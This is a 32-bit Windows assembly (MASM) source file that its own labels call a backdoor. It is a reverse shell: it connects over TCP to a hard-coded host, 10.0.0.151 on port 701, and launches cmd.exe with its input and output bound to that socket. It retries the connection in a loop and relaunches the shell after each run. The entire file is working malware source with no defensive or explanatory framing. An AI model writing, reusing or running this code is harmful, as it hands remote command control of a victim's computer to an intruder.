.386
.MODEL FLAT, STDCALL

include windows.inc
include kernel32.inc
include user32.inc
include Ws2_32.inc
include msvcrt.inc

includelib msvcrt.lib
includelib kernel32.lib
includelib user32.lib
includelib Ws2_32.lib

.data
    startupSuccessState     db 0
    socketCreationState     db 0
    ipAddress                   db "10.0.0.151",0,0
    sockAddr sockaddr_in    <?>
    inetAddr                 db ? 
    sock SOCKET          ? 
    wsaData WSADATA         <?>
    host hostent            <?>
    id dw 1
    th HANDLE ?
    file_handle HANDLE ?
    theProcess STARTUPINFO <>
    info_proc PROCESS_INFORMATION <>
    cmd db "cmd.exe",0,0,13h,10h
    sock2 HANDLE ?


.code
    start:
        call ThreadBackDoor
        ThreadBackDoor:     
            mov id, 01h
            push OFFSET id
            push 0
            push 0
            push OFFSET backDoor
            push 0
            push 0
            mov eax, CreateThread
            call eax
            push id
            push INFINITE
            call WaitForSingleObject
    backDoor:   
                sub esp, 50h    
            ;#WSAStartup    
            mov dword ptr ss:[esp+04h], OFFSET wsaData
            mov dword ptr ss:[esp], 202h
            call WSAStartup
            ;socket
            WSASocketAT:
            mov dword ptr ss:[esp+14h],0
            mov dword ptr ss:[esp+10h],0
            mov dword ptr ss:[esp+0Ch],0
            mov dword ptr ss:[esp+8h],6
            mov dword ptr ss:[esp+4h],1
            mov dword ptr ss:[esp],2
            call WSASocketA
            mov sock, eax           
            ;Port
            mov dword ptr ss:[esp], 701d
            call htons
            ; Family
            mov DS:[sockAddr.sin_port],  ax
            mov DS:[sockAddr.sin_family], AF_INET
            mov dword ptr ss:[esp],OFFSET ipAddress
            call inet_addr
            mov dword ptr ds:[inetAddr-0ch],eax
            ;Connect - Address
            mov eax, OFFSET sock
            push 0h
            push 0h
            push 0h
            push 0h
            push 10h
            push OFFSET sockAddr.sin_family
            push  [eax]
            call WSAConnect
            cmp eax,0
            je connectSuccess
            jmp backDoor
            connectSuccess:
        shell:
            xor ebx, ebx    
            mov eax, sizeof theProcess
            push eax
            push 0
            push OFFSET theProcess
            call crt_memset
            mov DS:[theProcess.cb], sizeof theProcess
            mov DS:[theProcess.dwFlags],STARTF_USESTDHANDLES
            mov eax, [sock]
            mov DS:[theProcess.hStdInput], eax
            mov DS:[theProcess.hStdOutput], eax
            mov DS:[theProcess.hStdError],eax
            push OFFSET info_proc
            push OFFSET theProcess
            push 0
            push 0
            push 0
            push 1
            push 0
            push 0
            push OFFSET cmd
            push 0  
            call CreateProcess
        jmp backDoor    
    end backDoor
end start
